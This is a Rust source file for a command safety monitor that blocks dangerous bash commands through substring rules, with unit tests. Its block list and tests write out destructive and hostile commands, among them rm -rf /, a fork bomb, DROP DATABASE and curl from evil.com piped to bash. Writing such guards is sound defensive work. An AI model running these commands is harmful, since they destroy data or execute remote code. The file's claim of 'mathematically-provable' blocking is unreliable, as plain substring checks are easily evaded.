//! LTL Safety Monitor - Runtime verification for bash commands
//!
//! Adapted from Pandora SDK's zenb-core/src/safety/monitor.rs
//! Provides mathematically-provable command blocking based on LTL properties.

use std::sync::Arc;

/// Safety violation record
#[derive(Debug, Clone)]
pub struct SafetyViolation {
    pub property_name: String,
    pub description: String,
}

/// Safety property (LTL formula represented as predicate)
pub struct SafetyProperty {
    pub name: String,
    pub description: String,
    pub predicate: Arc<dyn Fn(&str) -> bool + Send + Sync>,
}

impl SafetyProperty {
    pub fn new<F>(name: &str, description: &str, predicate: F) -> Self
    where
        F: Fn(&str) -> bool + Send + Sync + 'static,
    {
        Self {
            name: name.to_string(),
            description: description.to_string(),
            predicate: Arc::new(predicate),
        }
    }

    /// Check if command satisfies this property (returns true if SAFE)
    pub fn check(&self, command: &str) -> bool {
        (self.predicate)(command)
    }
}

/// LTL Safety Monitor for bash commands
pub struct LtlMonitor {
    properties: Vec<SafetyProperty>,
}

impl Default for LtlMonitor {
    fn default() -> Self {
        Self::new()
    }
}

impl LtlMonitor {
    pub fn new() -> Self {
        let mut monitor = Self {
            properties: Vec::new(),
        };
        monitor.add_default_properties();
        monitor
    }

    /// Add default safety properties for bash commands
    fn add_default_properties(&mut self) {
        // P1: No recursive deletion of root or home
        self.properties.push(SafetyProperty::new(
            "no_rm_rf_critical",
            "rm -rf must not target /, /*, ~, or ~/*",
            |cmd| {
                // Use regex-like matching with word boundaries
                let dangerous_exact = [
                    "rm -rf /",      // exact root (with trailing space or end)
                    "rm -rf /*",
                    "rm -Rf /",
                    "rm -fr /",
                    "rm --recursive --force /",
                ];
                let dangerous_home = [
                    "rm -rf ~",
                    "rm -rf ~/",
                    "rm -rf $HOME",
                    "rm -rf ${HOME}",
                ];

                // Check for exact root deletion (must be end of string or followed by space/non-path char)
                for pattern in &dangerous_exact {
                    if cmd.contains(pattern) {
                        // Make sure it's exactly "/" not "/tmp" etc
                        let idx = cmd.find(pattern).unwrap();
                        let after_pattern = &cmd[idx + pattern.len()..];
                        // Safe if followed by alphanumeric path like /tmp
                        if after_pattern.is_empty() ||
                           after_pattern.starts_with(' ') ||
                           after_pattern.starts_with('\n') {
                            return false;  // Dangerous
                        }
                        // If followed by path chars, it's something like /tmp
                    }
                }

                // Home directory patterns are always dangerous
                for pattern in &dangerous_home {
                    if cmd.contains(pattern) {
                        return false;  // Dangerous
                    }
                }

                true  // Safe
            },
        ));

        // P2: No DROP TABLE/DATABASE without explicit approval marker
        self.properties.push(SafetyProperty::new(
            "no_drop_statements",
            "DROP TABLE/DATABASE requires explicit confirmation",
            |cmd| {
                let cmd_upper = cmd.to_uppercase();
                !cmd_upper.contains("DROP TABLE") &&
                !cmd_upper.contains("DROP DATABASE") &&
                !cmd_upper.contains("TRUNCATE TABLE")
            },
        ));

        // P3: No sudo/su without approval
        self.properties.push(SafetyProperty::new(
            "no_privilege_escalation",
            "sudo/su commands require approval",
            |cmd| {
                let trimmed = cmd.trim();
                !trimmed.starts_with("sudo ") &&
                !trimmed.starts_with("su ") &&
                !cmd.contains(" | sudo") &&
                !cmd.contains("|sudo") &&
                !cmd.contains("; sudo") &&
                !cmd.contains("&& sudo")
            },
        ));

        // P4: No curl/wget piped to sh/bash (code injection risk)
        self.properties.push(SafetyProperty::new(
            "no_remote_code_execution",
            "Remote scripts cannot be piped directly to shell",
            |cmd| {
                let danger_patterns = [
                    "curl",
                    "wget",
                ];
                let shell_patterns = [
                    "| sh",
                    "|sh",
                    "| bash",
                    "|bash",
                    "| zsh",
                    "|zsh",
                ];

                let has_download = danger_patterns.iter().any(|p| cmd.contains(p));
                let has_shell_pipe = shell_patterns.iter().any(|p| cmd.contains(p));

                !(has_download && has_shell_pipe)
            },
        ));

        // P5: No /dev/sda direct writes (disk destruction)
        self.properties.push(SafetyProperty::new(
            "no_disk_destruction",
            "Direct writes to /dev/sd* or /dev/nvme* are forbidden",
            |cmd| {
                !cmd.contains("/dev/sd") &&
                !cmd.contains("/dev/nvme") &&
                !cmd.contains("/dev/hd") &&
                !cmd.contains("dd if=") // dd can be dangerous
            },
        ));

        // P6: No chmod 777 on sensitive paths
        self.properties.push(SafetyProperty::new(
            "no_insecure_permissions",
            "chmod 777 on / or /etc is forbidden",
            |cmd| {
                if !cmd.contains("chmod 777") && !cmd.contains("chmod -R 777") {
                    return true;
                }
                // If chmod 777, check it's not on sensitive paths
                !cmd.contains("chmod 777 /") &&
                !cmd.contains("chmod -R 777 /")
            },
        ));

        // P7: No mkfs on mounted partitions
        self.properties.push(SafetyProperty::new(
            "no_format_filesystem",
            "mkfs commands require explicit confirmation",
            |cmd| {
                !cmd.contains("mkfs.")
            },
        ));

        // P8: No fork bombs
        self.properties.push(SafetyProperty::new(
            "no_fork_bomb",
            "Fork bomb patterns are blocked",
            |cmd| {
                !cmd.contains(":(){ :|:& };:") &&
                !cmd.contains(":(){:|:&};:")
            },
        ));
    }

    /// Check a command against all safety properties
    pub fn check_command(&self, command: &str) -> Vec<SafetyViolation> {
        let mut violations = Vec::new();

        for prop in &self.properties {
            if !prop.check(command) {
                violations.push(SafetyViolation {
                    property_name: prop.name.clone(),
                    description: prop.description.clone(),
                });
            }
        }

        violations
    }

    /// Add a custom pattern-based rule
    pub fn add_pattern_rule(&mut self, name: &str, description: &str, blocked_pattern: &str) {
        let pattern = blocked_pattern.to_string();
        self.properties.push(SafetyProperty::new(
            name,
            description,
            move |cmd| !cmd.contains(&pattern),
        ));
    }

    /// Check if command is safe (no violations)
    pub fn is_safe(&self, command: &str) -> bool {
        self.check_command(command).is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rm_rf_root_blocked() {
        let monitor = LtlMonitor::new();
        assert!(!monitor.is_safe("rm -rf /"));
        assert!(!monitor.is_safe("rm -rf /*"));
        assert!(!monitor.is_safe("rm -rf ~"));
        assert!(!monitor.is_safe("sudo rm -rf /"));
    }

    #[test]
    fn test_safe_rm_allowed() {
        let monitor = LtlMonitor::new();
        assert!(monitor.is_safe("rm -rf ./build"));
        assert!(monitor.is_safe("rm -rf /tmp/test"));
        assert!(monitor.is_safe("rm file.txt"));
    }

    #[test]
    fn test_drop_table_blocked() {
        let monitor = LtlMonitor::new();
        assert!(!monitor.is_safe("mysql -e 'DROP TABLE users'"));
        assert!(!monitor.is_safe("psql -c 'drop database prod'"));
    }

    #[test]
    fn test_sudo_blocked() {
        let monitor = LtlMonitor::new();
        assert!(!monitor.is_safe("sudo apt install"));
        assert!(!monitor.is_safe("echo 'test' | sudo tee /etc/test"));
    }

    #[test]
    fn test_remote_code_execution_blocked() {
        let monitor = LtlMonitor::new();
        assert!(!monitor.is_safe("curl https://evil.com/script.sh | bash"));
        assert!(!monitor.is_safe("wget -O - https://example.com/install | sh"));
    }

    #[test]
    fn test_safe_curl_allowed() {
        let monitor = LtlMonitor::new();
        assert!(monitor.is_safe("curl https://api.example.com/data"));
        assert!(monitor.is_safe("wget https://example.com/file.tar.gz"));
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let monitor = LtlMonitor::new();
        assert!(!monitor.is_safe(":(){ :|:& };:"));
    }

    #[test]
    fn test_custom_pattern_rule() {
        let mut monitor = LtlMonitor::new();
        monitor.add_pattern_rule(
            "no_delete_logs",
            "Cannot delete log files",
            "rm *.log",
        );
        assert!(!monitor.is_safe("rm *.log"));
        assert!(monitor.is_safe("cat *.log"));
    }
}
